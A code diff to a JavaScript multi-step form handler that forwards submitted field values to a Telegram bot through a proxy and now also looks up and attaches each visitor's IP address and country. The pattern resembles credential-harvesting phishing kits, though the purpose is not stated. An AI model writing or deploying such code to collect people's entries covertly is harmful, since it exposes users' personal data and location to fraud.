@@ -76,17 +76,29 @@ document.getElementById("multiStepForm").addEventListener("submit", function (e)
     message += `*${label}:* ${value}\n`;
   }
 
-  fetch(proxy + `https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: "Markdown"
+  // 🌐 Fetch IP and Country then send to Telegram
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(ipData => {
+      const ip = ipData.ip || "N/A";
+      const country = ipData.country_name || "Unknown";
+
+      message += `\n🌐 *IP Address:* ${ip}\n`;
+      message += `🏳️ *Country:* ${country}\n`;
+
+      return fetch(proxy + `https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
     })
-  }).then(res => res.json())
+    .then(res => res.json())
     .then(response => {
       if (response.ok) {
         const fileLabels = [
@@ -131,6 +143,6 @@ document.getElementById("multiStepForm").addEventListener("submit", function (e)
     .catch(error => {
       console.error("Error:", error);
       statusMsg.style.color = "red";
-      statusMsg.textContent = "❌ Network error. Please check your connection.";
+      statusMsg.textContent = "❌ Network error or failed to get IP.";
     });
 });
